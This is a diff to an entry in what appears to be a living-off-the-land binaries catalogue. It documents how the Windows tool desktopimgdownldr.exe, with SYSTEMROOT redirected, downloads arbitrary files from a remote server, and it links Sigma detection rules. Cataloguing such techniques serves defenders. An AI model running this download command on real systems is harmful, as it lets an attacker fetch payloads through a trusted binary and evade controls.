@@ -4,7 +4,7 @@ Description: Windows binary used to configure lockscreen/desktop image
 Author: Gal Kristal
 Created: 2020-06-28
 Commands:
-  - Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
+  - Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
     Description: Downloads the file and sets it as the computer's lockscreen
     Usecase: Download arbitrary files from a web server
     Category: Download
@@ -13,8 +13,6 @@ Commands:
     OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: c:\windows\system32\desktopimgdownldr.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
